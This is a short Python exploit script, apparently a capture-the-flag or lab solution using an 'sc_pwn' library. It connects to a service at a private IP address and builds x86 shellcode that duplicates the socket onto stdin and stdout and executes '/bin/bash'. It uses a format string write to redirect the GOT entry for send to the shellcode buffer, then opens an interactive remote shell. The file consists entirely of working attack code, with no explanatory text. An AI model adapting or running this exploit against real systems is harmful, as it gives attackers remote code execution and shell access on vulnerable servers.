#!/usr/bin/env python
from sc_pwn import *

rhp     = ("192.168.75.129",23456)

addr_got_send   = 0x0804b068
addr_buf        = 0x0804b120
addr_str_sh     = 0x08049091    # '/bin/bash'

#==========
def attack(nc):
    nc.read_until('Saying: ')

    """
    sc = ShellCode('x86',0x30)
    shellcode  = sc.dup2(4,0)
    shellcode += sc.dup2(4,1)
    shellcode += sc.execve(addr_str_sh)
    shellcode += sc.padding()

    fsb = FSB(len(shellcode),2)
    fsb.set_adrval(addr_got_send,addr_buf)
    formats = fsb.auto_write(index=5)
    """

    sc = ShellCode('x86')
    sc.dup2(4,0)
    sc.dup2(4,1)
    sc.execve(addr_str_sh)
    shellcode = sc.get()

    fsb = FSB(offset=len(shellcode),size=2)
    fsb.set_adrval(addr_got_send,addr_buf)
    fsb.auto_write(index=5)
    formats = fsb.get()
    
    exploit  = shellcode
    exploit += formats

    proc('Sending Exploit...')
    nc.sendln(exploit)

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
